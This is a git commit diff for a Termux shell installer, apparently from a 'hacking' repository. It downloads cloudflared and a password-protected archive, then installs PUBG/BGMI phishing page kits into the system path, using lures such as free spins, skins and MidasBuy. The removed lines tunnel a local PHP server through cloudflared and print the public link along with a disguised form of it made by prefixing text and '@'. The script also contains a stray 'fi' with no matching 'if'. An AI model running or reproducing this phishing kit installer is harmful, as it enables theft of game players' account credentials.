63e658678139a22a721a9e1342f375a5afdb4878
Online Hacking <45653647+OnlineHacKing@users.noreply.github.com>
2022-01-09 17:05:44 +0530

    Update 2.sh

--- 2.sh
+++ 2.sh
@@ -1,10 +1,56 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
-chmod +x *
-			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-			   termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
-
-                           cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-PUBG.rar
+unrar x -Password SUMAN-PUBG.rar
+rm -rf SUMAN-PUBG.rar 
+chmod +x ngrok
+chmod +x PUBG
+chmod +x BGMI
+chmod +x cloudflared
+clear
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo""
+echo
+cp -R cloudflared SUMAN/Collect-EVENT-LINE/
+cp -R cloudflared SUMAN/Collect-MC-Larent-Car/
+cp -R cloudflared SUMAN/Lucky-Spin-Godzila-S19/
+cp -R cloudflared SUMAN/MidasBuy/
+cp -R cloudflared SUMAN/SPIN-EVENT/
+cp -R cloudflared SUMAN/X-Suit/
+cp -R cloudflared SUMAN1/COLLECT-S19-ID/
+cp -R cloudflared SUMAN1/Godzilla-LuckySpin/
+cp -R cloudflared SUMAN1/RPS19-COLLECT/
+cp -R cloudflared SUMAN1/X-Suit-LuckySpin/
+chmod 7777 PUBG-BGMI_Phishing
+clear
+echo
+clear
+echo
+echo
+cp -R ngrok /data/data/com.termux/files/usr/bin
+cp -R SUMAN /data/data/com.termux/files/usr/bin
+cp -R SUMAN1 /data/data/com.termux/files/usr/bin
+cp -R PUBG /data/data/com.termux/files/usr/bin
+cp -R BGMI /data/data/com.termux/files/usr/bin
+cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
+cp -R cloudflared /data/data/com.termux/files/usr/bin
+cp -R OnlineHacking /data/data/com.termux/files/usr/bin
+echo
+echo
+echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
+echo
+fi
+sleep 3
+echo
+exit
